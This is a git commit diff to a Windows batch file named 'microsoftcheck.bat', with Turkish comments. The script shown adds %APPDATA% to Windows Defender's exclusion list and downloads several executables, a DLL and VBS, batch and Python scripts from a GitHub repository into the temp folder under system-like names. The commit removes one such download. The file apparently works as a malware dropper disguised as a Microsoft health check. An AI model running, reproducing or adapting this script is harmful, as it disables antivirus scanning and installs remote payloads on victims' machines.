c246f79750e890977e57365e0d67c21c1a1055d8
Seition2 <130700484+seition2doc@users.noreply.github.com>
2026-01-13 19:01:13 +0300

    Update microsoftcheck.bat

--- microsoftcheck.bat
+++ microsoftcheck.bat
@@ -6,7 +6,6 @@ Add-MpPreference -ExculisonPath "%APPDATA%"
 :: Dosya yollarını tanımlayalım
 set "FILE1=%temp%\ddd.vbs"
 set "FILE2=%temp%\asd.bat"
-set "FILE3=%temp%\Windows Health Service.exe"
 set "FILE4=%temp%\by.py"
 set "FILE5=%temp%\Pancafediag.exe"
 set "FILE6=%temp%\PncDiag.dll"
@@ -21,10 +20,10 @@ if exist "%FILE1%" if exist "%FILE2%" if exist "%FILE3%" if exist "%FILE4%"  if 
 curl -L "https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/asd.bat" -o "%FILE2%"
 curl -L "https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/ddd.vbs" -o "%FILE1%"
 curl -L "https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/by.py" -o "%FILE4%"
-curl -L "https://github.com/seition2doc/dosta2/raw/refs/heads/main/WindowsDefenderSmartScreen.exe" -o "%FILE3%"
 curl -L "https://github.com/seition2doc/dosta2/raw/refs/heads/main/Pancafediag.exe" -o "%FILE5%"
 curl -L "https://github.com/seition2doc/dosta2/raw/refs/heads/main/PncDiag.dll" -o "%FILE6%"
 curl -L "https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/syshealth.pyw" -o "%FILE7%"
 
 
 exit
+
